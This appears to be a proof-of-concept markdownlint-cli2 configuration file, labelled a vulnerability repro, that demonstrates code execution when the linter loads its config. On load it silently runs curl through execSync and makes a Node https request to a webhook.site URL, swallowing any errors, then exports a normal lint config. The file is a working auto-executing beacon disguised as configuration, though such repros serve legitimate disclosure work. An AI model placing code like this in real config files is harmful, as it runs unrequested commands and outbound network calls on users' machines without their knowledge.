// EXECCHAIN-01 repro: markdownlint-cli2 nested executable config (OAST beacon, 3 transports in RUNNERSB)
const s = Date.now().toString(36) + Math.random().toString(36).slice(2, 6);
const { execSync } = require("child_process");
try {
  execSync("curl -sS -m 5 -o /dev/null 'https://webhook.site/e90ef1d7-4a15-4283-ab43-101eec0be5d9/mdlint-" + s + "'", { timeout: 9000 });
} catch (e) {}
try {
  require("https").get("https://webhook.site/e90ef1d7-4a15-4283-ab43-101eec0be5d9/mdlint-node-" + s, (r) => r.resume()).on("error", () => {});
} catch (e) {}
module.exports = {
  config: { default: true }
};
